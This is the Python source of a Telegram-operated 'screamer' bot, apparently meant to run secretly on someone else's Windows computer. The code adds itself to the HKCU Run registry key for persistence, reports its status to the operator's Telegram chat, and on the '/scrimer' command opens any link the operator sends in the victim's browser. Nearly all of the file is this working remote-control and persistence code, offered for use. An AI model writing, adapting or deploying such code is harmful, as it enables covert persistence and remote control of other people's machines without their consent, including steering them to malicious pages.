import telebot
import webbrowser
import os
import winreg
import time
TOKEN1 = 'TOKEN' #This is second token who send you reports
TOKEN = 'TOKEN' #This is your first bot with who you control
chat_id1 = ""#It's your telegram chatid
filename_to_find = "FILE_NAME"#This if your file_name who if you change this file not add to strartup
def add_to_startup(exe_name, exe_path):
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as registry_key:
        winreg.SetValueEx(registry_key, exe_name, 0, winreg.REG_SZ, exe_path)

def find_and_add_to_startup(filename):
    current_directory = os.getcwd()
    found = False
    for file in os.listdir(current_directory):
        if file == filename:
            exe_path = os.path.abspath(file)
            add_to_startup("MyProgramStartup", exe_path)
            found = True
            break

    return found

filename_to_find = "FILE_NAME"

# Поиск файла в текущей директории и добавление в автозагрузку, если найден
file_found = find_and_add_to_startup(filename_to_find)
if file_found:
    bot = telebot.TeleBot(TOKEN1)
    bot.send_message(chat_id1,"Files is aded to autostartup")
else:
    bot = telebot.TeleBot(TOKEN1)
    bot.send_message(chat_id1, "Files is not aded to autostartup")



def connect_bot():
    return telebot.TeleBot(TOKEN)

def start_bot():
    connected = False
    while not connected:
        try:
            bot = connect_bot()
            connected = True
            bot2 = telebot.TeleBot(TOKEN)
            bot2.send_message(chat_id1, "Bot working")

            return bot
        except Exception as e:
            bot2 = telebot.TeleBot(TOKEN1)
            bot2.send_message(chat_id1, "Bot is already in use")
            time.sleep(300)  # Пауза в 5 минут (300 секунд)

def open_link(message):
    mess = message.text
    webbrowser.open(mess)

bot = start_bot()

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Hi, I am a Python bot who can send crimer if someone opens it. Now it's opened.")

@bot.message_handler(commands=['scrimer'])
def help(message):
    adwad = bot.send_message(message.chat.id, "What link should I open?")
    bot.register_next_step_handler(adwad, open_link)

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.send_message(message.chat.id, message.text)

bot.polling(none_stop=True)